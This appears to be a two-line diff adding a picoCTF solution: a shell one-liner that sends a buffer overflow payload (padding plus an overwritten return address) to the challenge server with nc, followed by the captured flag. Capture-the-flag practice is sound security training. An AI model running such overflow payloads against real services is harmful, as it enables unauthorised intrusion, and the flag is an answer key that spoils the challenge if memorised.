@@ -1,0 +1,2 @@
+(python3 -c "import sys; sys.stdout.buffer.write(b'A'*140 + b'\x30\x15\x40\x00' + b'\x0a')"; cat) | nc saturn.picoctf.net 57311
+picoCTF{Un_v3rr3_d3_v1n_57a672ee}
